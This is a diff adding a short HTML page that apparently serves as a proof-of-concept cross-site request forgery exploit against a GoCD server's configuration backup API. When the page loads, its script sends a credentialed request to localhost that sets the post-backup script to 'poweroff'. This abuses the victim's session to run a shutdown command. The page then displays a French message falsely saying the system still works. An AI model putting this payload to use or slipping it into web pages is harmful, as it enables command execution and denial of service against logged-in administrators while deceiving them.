@@ -1,0 +1,18 @@
+<html>
+<script>
+	function backup() {
+		var xmlhttp = new XMLHttpRequest();
+		xmlhttp.withCredentials = true;
+		xmlhttp.open("POST", "http://localhost:8153/go/api/config/backup", true);
+		xmlhttp.setRequestHeader("Accept", "application/vnd.go.cd.v1+json");
+		xmlhttp.send(JSON.stringify({
+			"schedule": null,
+			"post_backup_script": "poweroff",
+			"email_on_success": false,
+			"email_on_failure": false
+		}));
+	}
+	backup();
+</script>
+Le script s'est execute et le systeme fonctionne encore.
+</html>
